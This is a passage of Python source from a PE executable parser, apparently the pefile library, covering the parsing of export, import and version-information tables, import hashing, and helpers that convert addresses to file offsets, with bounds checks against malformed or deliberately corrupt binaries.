                    varfileinfo_struct.Var = []

                    # Process all entries

                    while True:
                        var_struct = self.__unpack_data__(
                            self.__Var_format__,
                            raw_data[var_offset:],
                            file_offset=start_offset + var_offset,
                        )

                        if not var_struct:
                            break

                        ustr_offset = (
                            version_struct.OffsetToData
                            + var_offset
                            + var_struct.sizeof()
                        )
                        try:
                            var_string = self.get_string_u_at_rva(ustr_offset)
                        except PEFormatError:
                            self.__warnings.append(
                                "Error parsing the version information, "
                                "attempting to read VarFileInfo Var string. "
                                "Can't read unicode string at offset 0x{0:x}".format(
                                    ustr_offset
                                )
                            )
                            break

                        if var_string is None:
                            break

                        varfileinfo_struct.Var.append(var_struct)

                        varword_offset = self.dword_align(
                            2 * (len(var_string) + 1)
                            + var_offset
                            + var_struct.sizeof(),
                            version_struct.OffsetToData,
                        )
                        orig_varword_offset = varword_offset

                        while (
                            varword_offset
                            < orig_varword_offset + var_struct.ValueLength
                        ):
                            word1 = self.get_word_from_data(
                                raw_data[varword_offset : varword_offset + 2], 0
                            )
                            word2 = self.get_word_from_data(
                                raw_data[varword_offset + 2 : varword_offset + 4], 0
                            )
                            varword_offset += 4

                            if isinstance(word1, int) and isinstance(word2, int):
                                var_struct.entry = {
                                    var_string: "0x%04x 0x%04x" % (word1, word2)
                                }

                        var_offset = self.dword_align(
                            var_offset + var_struct.Length, version_struct.OffsetToData
                        )

                        if var_offset <= var_offset + var_struct.Length:
                            break

            # Increment and align the offset
            stringfileinfo_offset = self.dword_align(
                stringfileinfo_struct.Length + stringfileinfo_offset,
                version_struct.OffsetToData,
            )

            # Check if all the StringFileInfo and VarFileInfo items have been processed
            if (
                stringfileinfo_struct.Length == 0
                or stringfileinfo_offset >= versioninfo_struct.Length
            ):
                break

        self.FileInfo.append(finfo)

    def parse_export_directory(self, rva, size, forwarded_only=False):
        """Parse the export directory.

        Given the RVA of the export directory, it will process all
        its entries.

        The exports will be made available as a list of ExportData
        instances in the 'IMAGE_DIRECTORY_ENTRY_EXPORT' PE attribute.
        """

        try:
            export_dir = self.__unpack_data__(
                self.__IMAGE_EXPORT_DIRECTORY_format__,
                self.get_data(
                    rva, Structure(self.__IMAGE_EXPORT_DIRECTORY_format__).sizeof()
                ),
                file_offset=self.get_offset_from_rva(rva),
            )
        except PEFormatError:
            self.__warnings.append(
                "Error parsing export directory at RVA: 0x%x" % (rva)
            )
            return

        if not export_dir:
            return

        # We keep track of the bytes left in the file and use it to set a upper
        # bound in the number of items that can be read from the different
        # arrays.
        def length_until_eof(rva):
            return len(self.__data__) - self.get_offset_from_rva(rva)

        try:
            address_of_names = self.get_data(
                export_dir.AddressOfNames,
                min(
                    length_until_eof(export_dir.AddressOfNames),
                    export_dir.NumberOfNames * 4,
                ),
            )
            address_of_name_ordinals = self.get_data(
                export_dir.AddressOfNameOrdinals,
                min(
                    length_until_eof(export_dir.AddressOfNameOrdinals),
                    export_dir.NumberOfNames * 4,
                ),
            )
            address_of_functions = self.get_data(
                export_dir.AddressOfFunctions,
                min(
                    length_until_eof(export_dir.AddressOfFunctions),
                    export_dir.NumberOfFunctions * 4,
                ),
            )
        except PEFormatError:
            self.__warnings.append(
                "Error parsing export directory at RVA: 0x%x" % (rva)
            )
            return

        exports = []

        max_failed_entries_before_giving_up = 10

        section = self.get_section_by_rva(export_dir.AddressOfNames)
        # Overly generous upper bound
        safety_boundary = len(self.__data__)
        if section:
            safety_boundary = (
                section.VirtualAddress
                + len(section.get_data())
                - export_dir.AddressOfNames
            )

        symbol_counts = collections.defaultdict(int)
        export_parsing_loop_completed_normally = True
        for i in range(min(export_dir.NumberOfNames, int(safety_boundary / 4))):
            symbol_ordinal = self.get_word_from_data(address_of_name_ordinals, i)

            if symbol_ordinal is not None and symbol_ordinal * 4 < len(
                address_of_functions
            ):
                symbol_address = self.get_dword_from_data(
                    address_of_functions, symbol_ordinal
                )
            else:
                # Corrupt? a bad pointer... we assume it's all
                # useless, no exports
                return None
            if symbol_address is None or symbol_address == 0:
                continue

            # If the function's RVA points within the export directory
            # it will point to a string with the forwarded symbol's string
            # instead of pointing the the function start address.
            if symbol_address >= rva and symbol_address < rva + size:
                forwarder_str = self.get_string_at_rva(symbol_address)
                try:
                    forwarder_offset = self.get_offset_from_rva(symbol_address)
                except PEFormatError:
                    continue
            else:
                if forwarded_only:
                    continue
                forwarder_str = None
                forwarder_offset = None

            symbol_name_address = self.get_dword_from_data(address_of_names, i)
            if symbol_name_address is None:
                max_failed_entries_before_giving_up -= 1
                if max_failed_entries_before_giving_up <= 0:
                    export_parsing_loop_completed_normally = False
                    break

            symbol_name = self.get_string_at_rva(
                symbol_name_address, MAX_SYMBOL_NAME_LENGTH
            )
            if not is_valid_function_name(symbol_name):
                export_parsing_loop_completed_normally = False
                break
            try:
                symbol_name_offset = self.get_offset_from_rva(symbol_name_address)
            except PEFormatError:
                max_failed_entries_before_giving_up -= 1
                if max_failed_entries_before_giving_up <= 0:
                    export_parsing_loop_completed_normally = False
                    break
                try:
                    symbol_name_offset = self.get_offset_from_rva(symbol_name_address)
                except PEFormatError:
                    max_failed_entries_before_giving_up -= 1
                    if max_failed_entries_before_giving_up <= 0:
                        export_parsing_loop_completed_normally = False
                        break
                    continue

            # File 0b1d3d3664915577ab9a32188d29bbf3542b86c7b9ce333e245496c3018819f1
            # was being parsed as potentially containing millions of exports.
            # Checking for duplicates addresses the issue.
            symbol_counts[(symbol_name, symbol_address)] += 1
            if symbol_counts[(symbol_name, symbol_address)] > 10:
                self.__warnings.append( "Export directory contains more than 10 repeated entries %s. Assuming corrupt." % (symbol_name,symbol_address))
                break
            elif len(symbol_counts) > self.max_symbol_exports:
                self.__warnings.append(
                    "Export directory contains more than {} symbol entries. "
                    "Assuming corrupt.".format(self.max_symbol_exports)
                )
                break

            exports.append(
                ExportData(
                    pe=self,
                    ordinal=export_dir.Base + symbol_ordinal,
                    ordinal_offset=self.get_offset_from_rva(
                        export_dir.AddressOfNameOrdinals + 2 * i
                    ),
                    address=symbol_address,
                    address_offset=self.get_offset_from_rva(
                        export_dir.AddressOfFunctions + 4 * symbol_ordinal
                    ),
                    name=symbol_name,
                    name_offset=symbol_name_offset,
                    forwarder=forwarder_str,
                    forwarder_offset=forwarder_offset,
                )
            )

        if not export_parsing_loop_completed_normally:
            self.__warnings.append( "RVA AddressOfNames in the export directory points to an invalid address: 0x%x" % export_dir.AddressOfNames)

        ordinals = {exp.ordinal for exp in exports}

        max_failed_entries_before_giving_up = 10

        section = self.get_section_by_rva(export_dir.AddressOfFunctions)
        # Overly generous upper bound
        safety_boundary = len(self.__data__)
        if section:
            safety_boundary = (
                section.VirtualAddress
                + len(section.get_data())
                - export_dir.AddressOfFunctions
            )

        symbol_counts = collections.defaultdict(int)
        export_parsing_loop_completed_normally = True
        for idx in range(min(export_dir.NumberOfFunctions, int(safety_boundary / 4))):

            if not idx + export_dir.Base in ordinals:
                try:
                    symbol_address = self.get_dword_from_data(address_of_functions, idx)
                except PEFormatError:
                    symbol_address = None

                if symbol_address is None:
                    max_failed_entries_before_giving_up -= 1
                    if max_failed_entries_before_giving_up <= 0:
                        export_parsing_loop_completed_normally = False
                        break

                if symbol_address == 0:
                    continue

                # Checking for forwarder again.
                if (
                    symbol_address is not None
                    and symbol_address >= rva
                    and symbol_address < rva + size
                ):
                    forwarder_str = self.get_string_at_rva(symbol_address)
                else:
                    forwarder_str = None

                # File 0b1d3d3664915577ab9a32188d29bbf3542b86c7b9ce333e245496c3018819f1
                # was being parsed as potentially containing millions of exports.
                # Checking for duplicates addresses the issue.
                symbol_counts[symbol_address] += 1
                if symbol_counts[symbol_address] > self.max_repeated_symbol:
                    # if most_common and most_common[0][1] > 10:
                    self.__warnings.append(
                        "Export directory contains more than {} repeated "
                        "ordinal entries (0x{:x}). Assuming corrupt.".format(
                            self.max_repeated_symbol, symbol_address
                        )
                    )
                    break
                elif len(symbol_counts) > self.max_symbol_exports:
                    self.__warnings.append( "Export directory contains more than %d ordinal entries. Assuming corrupt." % self.max_symbol_exports)
                    break

                exports.append(
                    ExportData(
                        ordinal=export_dir.Base + idx,
                        address=symbol_address,
                        name=None,
                        forwarder=forwarder_str,
                    )
                )

        if not export_parsing_loop_completed_normally:
            self.__warnings.append( "RVA AddressOfFunctions in the export directory points to an invalid address: 0x%x" % export_dir.AddressOfFunctions)
            return

        if not exports and export_dir.all_zeroes():
            return None
        return ExportDirData(
            struct=export_dir,
            symbols=exports,
            name=self.get_string_at_rva(export_dir.Name),
        )

    def dword_align(self, offset, base):
        return ((offset + base + 3) & 0xFFFFFFFC) - (base & 0xFFFFFFFC)

    def normalize_import_va(self, va):

        # Setup image range
        begin_of_image = self.OPTIONAL_HEADER.ImageBase
        end_of_image = self.OPTIONAL_HEADER.ImageBase + self.OPTIONAL_HEADER.SizeOfImage

        # Try to avoid bogus VAs, which are out of the image.
        # This also filters out entries that are zero
        if begin_of_image <= va and va < end_of_image:
            va -= begin_of_image
        return va

    def parse_delay_import_directory(self, rva, size):
        """Walk and parse the delay import directory."""

        import_descs = []
        error_count = 0
        while True:
            try:
                # If the RVA is invalid all would blow up. Some PEs seem to be
                # specially nasty and have an invalid RVA.
                data = self.get_data(
                    rva,
                    Structure(self.__IMAGE_DELAY_IMPORT_DESCRIPTOR_format__).sizeof(),
                )
            except PEFormatError:
                self.__warnings.append(
                    "Error parsing the Delay import directory at RVA: 0x%x" % (rva)
                )
                break

            file_offset = self.get_offset_from_rva(rva)
            import_desc = self.__unpack_data__(
                self.__IMAGE_DELAY_IMPORT_DESCRIPTOR_format__,
                data,
                file_offset=file_offset,
            )

            # If the structure is all zeros, we reached the end of the list
            if not import_desc or import_desc.all_zeroes():
                break
            contains_addresses = False

            # Handle old import descriptor that has Virtual Addresses instead of RVAs
            # This version of import descriptor is created by old Visual Studio versions
            # (pre 6.0)
            # Can only be present in 32-bit binaries (no 64-bit compiler existed at the
            # time)
            # Sample: e8d3bff0c1a9a6955993f7a441121a2692261421e82fdfadaaded45d3bea9980
            if (
                import_desc.grAttrs == 0
                and self.FILE_HEADER.Machine == MACHINE_TYPE["IMAGE_FILE_MACHINE_I386"]
            ):
                import_desc.pBoundIAT = self.normalize_import_va(import_desc.pBoundIAT)
                import_desc.pIAT = self.normalize_import_va(import_desc.pIAT)
                import_desc.pINT = self.normalize_import_va(import_desc.pINT)
                import_desc.pUnloadIAT = self.normalize_import_va(
                    import_desc.pUnloadIAT
                )
                import_desc.phmod = self.normalize_import_va(import_desc.pUnloadIAT)
                import_desc.szName = self.normalize_import_va(import_desc.szName)
                contains_addresses = True

            rva += import_desc.sizeof()

            # If the array of thunks is somewhere earlier than the import
            # descriptor we can set a maximum length for the array. Otherwise
            # just set a maximum length of the size of the file
            max_len = len(self.__data__) - file_offset
            if rva > import_desc.pINT or rva > import_desc.pIAT:
                max_len = max(rva - import_desc.pINT, rva - import_desc.pIAT)

            import_data = []
            try:
                import_data = self.parse_imports(
                    import_desc.pINT,
                    import_desc.pIAT,
                    None,
                    max_len,
                    contains_addresses,
                )
            except PEFormatError as excp:
                self.__warnings.append(
                    "Error parsing the Delay import directory. "
                    "Invalid import data at RVA: 0x{0:x} ({1})".format(rva, excp.value)
                )

            if error_count > 5:
                self.__warnings.append(
                    "Too many errors parsing the Delay import directory. "
                    "Invalid import data at RVA: 0x{0:x}".format(rva)
                )
                break

            if not import_data:
                error_count += 1
                continue

            if self.__total_import_symbols > MAX_IMPORT_SYMBOLS:
                self.__warnings.append(
                    "Error, too many imported symbols %d (>%s)"
                    % (self.__total_import_symbols, MAX_IMPORT_SYMBOLS)
                )
                break

            dll = self.get_string_at_rva(import_desc.szName, MAX_DLL_LENGTH)
            if not is_valid_dos_filename(dll):
                dll = b("*invalid*")

            if dll:
                for symbol in import_data:
                    if symbol.name is None:
                        funcname = ordLookup(dll.lower(), symbol.ordinal)
                        if funcname:
                            symbol.name = funcname
                import_descs.append(
                    ImportDescData(struct=import_desc, imports=import_data, dll=dll)
                )

        return import_descs

    def get_rich_header_hash(self, algorithm="md5"):
        if not hasattr(self, "RICH_HEADER") or self.RICH_HEADER is None:
            return ""

        if algorithm == "md5":
            return md5(self.RICH_HEADER.clear_data).hexdigest()
        elif algorithm == "sha1":
            return sha1(self.RICH_HEADER.clear_data).hexdigest()
        elif algorithm == "sha256":
            return sha256(self.RICH_HEADER.clear_data).hexdigest()
        elif algorithm == "sha512":
            return sha512(self.RICH_HEADER.clear_data).hexdigest()

        raise Exception("Invalid hashing algorithm specified")

    def get_imphash(self):
        impstrs = []
        exts = ["ocx", "sys", "dll"]
        if not hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
            return ""
        for entry in self.DIRECTORY_ENTRY_IMPORT:
            if isinstance(entry.dll, bytes):
                libname = entry.dll.decode().lower()
            else:
                libname = entry.dll.lower()
            parts = libname.rsplit(".", 1)

            if len(parts) > 1 and parts[1] in exts:
                libname = parts[0]

            entry_dll_lower = entry.dll.lower()
            for imp in entry.imports:
                funcname = None
                if not imp.name:
                    funcname = ordLookup(
                        entry_dll_lower, imp.ordinal, make_name=True
                    )
                    if not funcname:
                        raise PEFormatError( "Unable to look up ordinal 0x%0x: 0x%04x" % (entry.dll,imp.ordinal))
                else:
                    funcname = imp.name

                if not funcname:
                    continue

                if isinstance(funcname, bytes):
                    funcname = funcname.decode()
                impstrs.append("%s.%s" % (libname.lower(), funcname.lower()))

        return md5(",".join(impstrs).encode()).hexdigest()

    def parse_import_directory(self, rva, size, dllnames_only=False):
        """Walk and parse the import directory."""

        import_descs = []
        error_count = 0
        image_import_descriptor_size = Structure(
            self.__IMAGE_IMPORT_DESCRIPTOR_format__
        ).sizeof()
        while True:
            try:
                # If the RVA is invalid all would blow up. Some EXEs seem to be
                # specially nasty and have an invalid RVA.
                data = self.get_data(rva, image_import_descriptor_size)
            except PEFormatError:
                self.__warnings.append( "Error parsing the import directory at RVA: 0x%x" % rva)
                break

            file_offset = self.get_offset_from_rva(rva)
            import_desc = self.__unpack_data__(
                self.__IMAGE_IMPORT_DESCRIPTOR_format__, data, file_offset=file_offset
            )

            # If the structure is all zeros, we reached the end of the list
            if not import_desc or import_desc.all_zeroes():
                break

            rva += import_desc.sizeof()

            # If the array of thunks is somewhere earlier than the import
            # descriptor we can set a maximum length for the array. Otherwise
            # just set a maximum length of the size of the file
            max_len = len(self.__data__) - file_offset
            if rva > import_desc.OriginalFirstThunk or rva > import_desc.FirstThunk:
                max_len = max(
                    rva - import_desc.OriginalFirstThunk, rva - import_desc.FirstThunk
                )

            import_data = []
            if not dllnames_only:
                try:
                    import_data = self.parse_imports(
                        import_desc.OriginalFirstThunk,
                        import_desc.FirstThunk,
                        import_desc.ForwarderChain,
                        max_length=max_len,
                    )
                except PEFormatError as e:
                    self.__warnings.append( "Error parsing the import directory. Invalid Import data at RVA: 0x%x 0x%x" % (rva, e.value))

                if error_count > 5:
                    self.__warnings.append( "Too many errors parsing the import directory. Invalid import data at RVA: 0x%x" % rva )
                    break

                if not import_data:
                    error_count += 1
                    # TODO: do not continue here
                    continue

            dll = self.get_string_at_rva(import_desc.Name, MAX_DLL_LENGTH)
            if not is_valid_dos_filename(dll):
                dll = b("*invalid*")

            if dll:
                for symbol in import_data:
                    if symbol.name is None:
                        funcname = ordLookup(dll.lower(), symbol.ordinal)
                        if funcname:
                            symbol.name = funcname
                import_descs.append(
                    ImportDescData(struct=import_desc, imports=import_data, dll=dll)
                )

        if not dllnames_only:
            suspicious_imports = set(["LoadLibrary", "GetProcAddress"])
            suspicious_imports_count = 0
            total_symbols = 0
            for imp_dll in import_descs:
                for symbol in imp_dll.imports:
                    for suspicious_symbol in suspicious_imports:
                        if not symbol or not symbol.name:
                            continue
                        name = symbol.name
                        if type(symbol.name) == bytes:
                            name = symbol.name.decode("utf-8")
                        if name.startswith(suspicious_symbol):
                            suspicious_imports_count += 1
                            break
                    total_symbols += 1
            if (
                suspicious_imports_count == len(suspicious_imports)
                and total_symbols < 20
            ):
                self.__warnings.append(
                    "Imported symbols contain entries typical of packed executables."
                )

        return import_descs

    def parse_imports(
        self,
        original_first_thunk,
        first_thunk,
        forwarder_chain,
        max_length=None,
        contains_addresses=False,
    ):
        """Parse the imported symbols.

        It will fill a list, which will be available as the dictionary
        attribute "imports". Its keys will be the DLL names and the values
        of all the symbols imported from that object.
        """

        imported_symbols = []

        # Import Lookup Table. Contains ordinals or pointers to strings.
        ilt = self.get_import_table(
            original_first_thunk, max_length, contains_addresses
        )
        # Import Address Table. May have identical content to ILT if
        # PE file is not bound. It will contain the address of the
        # imported symbols once the binary is loaded or if it is already
        # bound.
        iat = self.get_import_table(first_thunk, max_length, contains_addresses)

        # OC Patch:
        # Would crash if IAT or ILT had None type
        if (not iat or len(iat) == 0) and (not ilt or len(ilt) == 0):
            self.__warnings.append( "Damaged Import Table information. ILT and/or IAT appear to be broken. OriginalFirstThunk: 0x%x FirstThunk: 0x%x" % (original_first_thunk, first_thunk))
            return []

        table = None
        if ilt:
            table = ilt
        elif iat:
            table = iat
        else:
            return None

        imp_offset = 4
        address_mask = 0x7FFFFFFF
        if self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE:
            ordinal_flag = IMAGE_ORDINAL_FLAG
        elif self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS:
            ordinal_flag = IMAGE_ORDINAL_FLAG64
            imp_offset = 8
            address_mask = 0x7FFFFFFFFFFFFFFF
        else:
            # Some PEs may have an invalid value in the Magic field of the
            # Optional Header. Just in case the remaining file is parseable
            # let's pretend it's a 32bit PE32 by default.
            ordinal_flag = IMAGE_ORDINAL_FLAG

        num_invalid = 0
        for idx, tbl_entry in enumerate(table):
            imp_ord = None
            imp_hint = None
            imp_name = None
            name_offset = None
            hint_name_table_rva = None
            import_by_ordinal = False  # declare it here first

            if tbl_entry.AddressOfData:
                # If imported by ordinal, we will append the ordinal number
                #
                if tbl_entry.AddressOfData & ordinal_flag:
                    import_by_ordinal = True
                    imp_ord = tbl_entry.AddressOfData & 0xFFFF
                    imp_name = None
                    name_offset = None
                else:
                    import_by_ordinal = False
                    try:
                        hint_name_table_rva = tbl_entry.AddressOfData & address_mask
                        data = self.get_data(hint_name_table_rva, 2)
                        # Get the Hint
                        imp_hint = self.get_word_from_data(data, 0)
                        imp_name = self.get_string_at_rva(
                            tbl_entry.AddressOfData + 2, MAX_IMPORT_NAME_LENGTH
                        )
                        if not is_valid_function_name(imp_name):
                            imp_name = b("*invalid*")

                        name_offset = self.get_offset_from_rva(
                            tbl_entry.AddressOfData + 2
                        )
                    except PEFormatError:
                        pass

                # by nriva: we want the ThunkRVA and ThunkOffset
                thunk_offset = tbl_entry.get_file_offset()
                thunk_rva = self.get_rva_from_offset(thunk_offset)

            imp_address = (
                first_thunk + self.OPTIONAL_HEADER.ImageBase + idx * imp_offset
            )

            struct_iat = None
            try:
                if iat and ilt and ilt[idx].AddressOfData != iat[idx].AddressOfData:
                    imp_bound = iat[idx].AddressOfData
                    struct_iat = iat[idx]
                else:
                    imp_bound = None
            except IndexError:
                imp_bound = None

            # The file with hashes:
            #
            # MD5: bfe97192e8107d52dd7b4010d12b2924
            # SHA256: 3d22f8b001423cb460811ab4f4789f277b35838d45c62ec0454c877e7c82c7f5
            #
            # has an invalid table built in a way that it's parseable but contains
            # invalid entries that lead pefile to take extremely long amounts of time to
            # parse. It also leads to extreme memory consumption.
            # To prevent similar cases, if invalid entries are found in the middle of a
            # table the parsing will be aborted
            #
            if imp_ord is None and imp_name is None:
                raise PEFormatError("Invalid entries, aborting parsing.")

            # Some PEs appear to interleave valid and invalid imports. Instead of
            # aborting the parsing altogether we will simply skip the invalid entries.
            # Although if we see 1000 invalid entries and no legit ones, we abort.
            if imp_name == b("*invalid*"):
                if num_invalid > 1000 and num_invalid == idx:
                    raise PEFormatError("Too many invalid names, aborting parsing.")
                num_invalid += 1
                continue

            if imp_ord or imp_name:
                imported_symbols.append(
                    ImportData(
                        pe=self,
                        struct_table=tbl_entry,
                        struct_iat=struct_iat,  # for bound imports if any
                        import_by_ordinal=import_by_ordinal,
                        ordinal=imp_ord,
                        ordinal_offset=tbl_entry.get_file_offset(),
                        hint=imp_hint,
                        name=imp_name,
                        name_offset=name_offset,
                        bound=imp_bound,
                        address=imp_address,
                        hint_name_table_rva=hint_name_table_rva,
                        thunk_offset=thunk_offset,
                        thunk_rva=thunk_rva,
                    )
                )

        return imported_symbols

    def get_import_table(self, rva, max_length=None, contains_addresses=False):

        table = []

        # We need the ordinal flag for a simple heuristic
        # we're implementing within the loop
        #
        if self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE:
            ordinal_flag = IMAGE_ORDINAL_FLAG
            format = self.__IMAGE_THUNK_DATA_format__
        elif self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS:
            ordinal_flag = IMAGE_ORDINAL_FLAG64
            format = self.__IMAGE_THUNK_DATA64_format__
        else:
            # Some PEs may have an invalid value in the Magic field of the
            # Optional Header. Just in case the remaining file is parseable
            # let's pretend it's a 32bit PE32 by default.
            ordinal_flag = IMAGE_ORDINAL_FLAG
            format = self.__IMAGE_THUNK_DATA_format__

        expected_size = Structure(format).sizeof()
        MAX_ADDRESS_SPREAD = 128 * 2**20  # 128 MB
        ADDR_4GB = 2**32
        MAX_REPEATED_ADDRESSES = 15
        repeated_address = 0
        addresses_of_data_set_64 = AddressSet()
        addresses_of_data_set_32 = AddressSet()
        start_rva = rva
        while rva:
            if max_length is not None and rva >= start_rva + max_length:
                self.__warnings.append(
                    "Error parsing the import table. Entries go beyond bounds."
                )
                break
            # Enforce an upper bounds on import symbols.
            if self.__total_import_symbols > MAX_IMPORT_SYMBOLS:
                self.__warnings.append(
                    "Excessive number of imports %d (>%s)"
                    % (self.__total_import_symbols, MAX_IMPORT_SYMBOLS)
                )
                break

            self.__total_import_symbols += 1

            # if we see too many times the same entry we assume it could be
            # a table containing bogus data (with malicious intent or otherwise)
            if repeated_address >= MAX_REPEATED_ADDRESSES:
                return []

            # if the addresses point somewhere but the difference between the highest
            # and lowest address is larger than MAX_ADDRESS_SPREAD we assume a bogus
            # table as the addresses should be contained within a module
            if addresses_of_data_set_32.diff() > MAX_ADDRESS_SPREAD:
                return []
            if addresses_of_data_set_64.diff() > MAX_ADDRESS_SPREAD:
                return []

            failed = False
            try:
                data = self.get_data(rva, expected_size)
            except PEFormatError:
                failed = True

            if failed or len(data) != expected_size:
                self.__warnings.append( "Error parsing the import table. Invalid data at RVA: 0x%x" % rva)
                return None

            thunk_data = self.__unpack_data__(
                format, data, file_offset=self.get_offset_from_rva(rva)
            )

            # If the thunk data contains VAs instead of RVAs, we need to normalize them
            if contains_addresses:
                thunk_data.AddressOfData = self.normalize_import_va(
                    thunk_data.AddressOfData
                )
                thunk_data.ForwarderString = self.normalize_import_va(
                    thunk_data.ForwarderString
                )
                thunk_data.Function = self.normalize_import_va(thunk_data.Function)
                thunk_data.Ordinal = self.normalize_import_va(thunk_data.Ordinal)

            # Check if the AddressOfData lies within the range of RVAs that it's
            # being scanned, abort if that is the case, as it is very unlikely
            # to be legitimate data.
            # Seen in PE with SHA256:
            # 5945bb6f0ac879ddf61b1c284f3b8d20c06b228e75ae4f571fa87f5b9512902c
            if (
                thunk_data
                and thunk_data.AddressOfData >= start_rva
                and thunk_data.AddressOfData <= rva
            ):
                self.__warnings.append(
                    "Error parsing the import table. "
                    "AddressOfData overlaps with THUNK_DATA for "
                    "THUNK at RVA 0x%x" % (rva)
                )
                break

            if thunk_data and thunk_data.AddressOfData:
                addr_of_data = thunk_data.AddressOfData
                # If the entry looks like could be an ordinal...
                if addr_of_data & ordinal_flag:
                    # but its value is beyond 2^16, we will assume it's a
                    # corrupted and ignore it altogether
                    if addr_of_data & 0x7FFFFFFF > 0xFFFF:
                        return []
                # and if it looks like it should be an RVA
                else:
                    # keep track of the RVAs seen and store them to study their
                    # properties. When certain non-standard features are detected
                    # the parsing will be aborted
                    if addr_of_data >= ADDR_4GB:
                        the_set = addresses_of_data_set_64
                    else:
                        the_set = addresses_of_data_set_32

                    if addr_of_data in the_set:
                        repeated_address += 1
                    the_set.add(addr_of_data)

            if not thunk_data or thunk_data.all_zeroes():
                break

            rva += thunk_data.sizeof()

            table.append(thunk_data)

        return table

    def get_memory_mapped_image(self, max_virtual_address=0x10000000, ImageBase=None):
        """Returns the data corresponding to the memory layout of the PE file.

        The data includes the PE header and the sections loaded at offsets
        corresponding to their relative virtual addresses. (the VirtualAddress
        section header member).
        Any offset in this data corresponds to the absolute memory address
        ImageBase+offset.

        The optional argument 'max_virtual_address' provides with means of limiting
        which sections are processed.
        Any section with their VirtualAddress beyond this value will be skipped.
        Normally, sections with values beyond this range are just there to confuse
        tools. It's a common trick to see in packed executables.

        If the 'ImageBase' optional argument is supplied, the file's relocations
        will be applied to the image by calling the 'relocate_image()' method. Beware
        that the relocation information is applied permanently.
        """

        # Rebase if requested
        #
        if ImageBase is not None:

            # Keep a copy of the image's data before modifying it by rebasing it
            #
            original_data = self.__data__

            self.relocate_image(ImageBase)

        # Collect all sections in one code block
        mapped_data = self.__data__[:]
        for section in self.sections:

            # Miscellaneous integrity tests.
            # Some packer will set these to bogus values to make tools go nuts.
            if section.Misc_VirtualSize == 0 and section.SizeOfRawData == 0:
                continue

            srd = section.SizeOfRawData
            prd = self.adjust_FileAlignment(
                section.PointerToRawData, self.OPTIONAL_HEADER.FileAlignment
            )
            VirtualAddress_adj = self.adjust_SectionAlignment(
                section.VirtualAddress,
                self.OPTIONAL_HEADER.SectionAlignment,
                self.OPTIONAL_HEADER.FileAlignment,
            )

            if (
                srd > len(self.__data__)
                or prd > len(self.__data__)
                or srd + prd > len(self.__data__)
                or VirtualAddress_adj >= max_virtual_address
            ):
                continue

            padding_length = VirtualAddress_adj - len(mapped_data)

            if padding_length > 0:
                mapped_data += b"\0" * padding_length
            elif padding_length < 0:
                mapped_data = mapped_data[:padding_length]

            mapped_data += section.get_data()

        # If the image was rebased, restore it to its original form
        #
        if ImageBase is not None:
            self.__data__ = original_data

        return mapped_data

    def get_resources_strings(self):
        """Returns a list of all the strings found withing the resources (if any).

        This method will scan all entries in the resources directory of the PE, if
        there is one, and will return a [] with the strings.

        An empty list will be returned otherwise.
        """

        resources_strings = []

        if hasattr(self, "DIRECTORY_ENTRY_RESOURCE"):

            for res_type in self.DIRECTORY_ENTRY_RESOURCE.entries:
                if hasattr(res_type, "directory"):
                    for resource_id in res_type.directory.entries:
                        if hasattr(resource_id, "directory"):
                            if (
                                hasattr(resource_id.directory, "strings")
                                and resource_id.directory.strings
                            ):
                                for res_string in list(
                                    resource_id.directory.strings.values()
                                ):
                                    resources_strings.append(res_string)

        return resources_strings

    def get_data(self, rva=0, length=None):
        """Get data regardless of the section where it lies on.

        Given a RVA and the size of the chunk to retrieve, this method
        will find the section where the data lies and return the data.
        """

        s = self.get_section_by_rva(rva)

        if length:
            end = rva + length
        else:
            end = None

        if not s:
            if rva < len(self.header):
                return self.header[rva:end]

            # Before we give up we check whether the file might
            # contain the data anyway. There are cases of PE files
            # without sections that rely on windows loading the first
            # 8291 bytes into memory and assume the data will be
            # there
            # A functional file with these characteristics is:
            # MD5: 0008892cdfbc3bda5ce047c565e52295
            # SHA-1: c7116b9ff950f86af256defb95b5d4859d4752a9
            #
            if rva < len(self.__data__):
                return self.__data__[rva:end]

            raise PEFormatError("data at RVA can't be fetched. Corrupt header?")

        return s.get_data(rva, length)

    def get_rva_from_offset(self, offset):
        """Get the RVA corresponding to this file offset."""

        s = self.get_section_by_offset(offset)
        if not s:
            if self.sections:
                lowest_rva = min(
                    [
                        self.adjust_SectionAlignment(
                            s.VirtualAddress,
                            self.OPTIONAL_HEADER.SectionAlignment,
                            self.OPTIONAL_HEADER.FileAlignment,
                        )
                        for s in self.sections
                    ]
                )
                if offset < lowest_rva:
                    # We will assume that the offset lies within the headers, or
                    # at least points before where the earliest section starts
                    # and we will simply return the offset as the RVA
                    #
                    # The case illustrating this behavior can be found at:
                    # http://corkami.blogspot.com/2010/01/hey-hey-hey-whats-in-your-head.html
                    # where the import table is not contained by any section
                    # hence the RVA needs to be resolved to a raw offset
                    return offset
                return None
            else:
                return offset
        return s.get_rva_from_offset(offset)

    def get_offset_from_rva(self, rva):
        """Get the file offset corresponding to this RVA.

        Given a RVA , this method will find the section where the
        data lies and return the offset within the file.
        """

        s = self.get_section_by_rva(rva)
        if not s:

            # If not found within a section assume it might
            # point to overlay data or otherwise data present
            # but not contained in any section. In those
            # cases the RVA should equal the offset
            if rva < len(self.__data__):
                return rva

            raise PEFormatError("data at RVA 0x%x can't be fetched" % rva)

        return s.get_offset_from_rva(rva)

    def get_string_at_rva(self, rva, max_length=MAX_STRING_LENGTH):
        """Get an ASCII string located at the given address."""

        if rva is None:
            return None

        s = self.get_section_by_rva(rva)
        if not s:
            return self.get_string_from_data(0, self.__data__[rva : rva + max_length])
        return self.get_string_from_data(0, s.get_data(rva, length=max_length))

    def get_bytes_from_data(self, offset, data):
        """."""
        if offset > len(data):
            return b""
        d = data[offset:]
        if isinstance(d, bytearray):
            return bytes(d)
        return d

    def get_string_from_data(self, offset, data):
        """Get an ASCII string from data."""
        s = self.get_bytes_from_data(offset, data)
        end = s.find(b"\0")
        if end >= 0:
            s = s[:end]
        return s

    def get_string_u_at_rva(self, rva, max_length=2**16, encoding=None):
        """Get an Unicode string located at the given address."""

        if max_length == 0:
            return b""

        # If the RVA is invalid let the exception reach the callers. All
        # call-sites of get_string_u_at_rva() will handle it.
        data = self.get_data(rva, 2)
        # max_length is the maximum count of 16bit characters needs to be
        # doubled to get size in bytes
        max_length <<= 1

        requested = min(max_length, 256)
        data = self.get_data(rva, requested)
        # try to find null-termination
